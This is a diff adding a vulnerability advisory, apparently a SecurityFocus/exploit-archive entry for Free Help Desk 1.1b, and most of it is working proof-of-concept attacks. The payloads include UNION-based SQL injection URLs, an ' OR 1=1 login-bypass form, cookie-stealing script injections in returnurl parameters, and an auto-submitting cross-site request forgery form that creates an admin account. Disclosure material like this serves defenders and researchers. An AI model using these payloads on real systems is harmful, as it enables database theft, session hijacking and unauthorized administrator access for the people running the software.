@@ -1,0 +1,59 @@
+source: http://www.securityfocus.com/bid/49721/info
+
+Free Help Desk is prone to the following input-validation vulnerabilities:
+
+1. A cross-site scripting vulnerability
+2. Multiple SQL-injection vulnerabilities
+3. A cross-site request-forgery vulnerability
+
+Exploiting these issues could allow an attacker to execute arbitrary code, steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+Free Help Desk 1.1b is vulnerable; other versions may also be affected. 
+
+SQL injection:
+
+URIs
+
+http://www.example.com/index.php?sub=users&action=edit&user_id=-1%27%20union%20select%201,2,3,version%28%29,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27%20+--+
+http://www.example.com/index.php?sub=types&action=edit&type_id=123%27%20union%20select%201,2,version%28%29,4,5,6%20+--+
+http://www.example.com/index.php?sub=help&action=details&call_id=1%27%20union%20select%201,version%28%29,3,4,5,6,7,8,9,10,11,12,13,14,15%20+--+
+http://www.example.com/index.php?sub=help&call_first_name=%22%20and%201=1%20+--+
+
+Inputs:
+
+<form action="http://www.example.com/index.php" method="post">
+<input type="hidden" name="user" value="' OR 1=1 -- ">
+<input type="hidden" name="pass" value="1">
+<input name="send" value="exploit" type="submit">
+</form>
+
+
+Cross-site scripting:
+
+URIs
+
+http://www.example.com/index.php?sub=types&action=add&type=1&returnurl=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/index.php?sub=types&action=edit&type_id=15&type=1&returnurl=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/index.php?sub=types&action=add&type=2&returnurl=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/index.php?sub=types&action=edit&type_id=8&type=2&returnurl=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/index.php?sub=staff&action=add&type=&returnurl=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/index.php?sub=staff&action=edit&type_id=7&type=&returnurl=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/index.php?sub=types&action=add&type=3&returnurl=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+
+Cross-site request-forgery:
+
+Input:
+
+<form action="http://www.example.com/index.php?sub=users&action=store&type=add" method="post">
+<input type="hidden" name="user_id" value="">
+<input type="hidden" name="user_name" value="newadmin">
+<input type="hidden" name="user_login" value="newadmin">
+<input type="hidden" name="user_password" value="123456">
+<input type="hidden" name="user_password_confirm" value="123456">
+<input type="hidden" name="user_level" value="0">
+<input type="hidden" name="user_email" value="">
+<input type="submit" id="btn"> 
+</form>
+<script>
+document.getElementById('btn').click();
+</script>
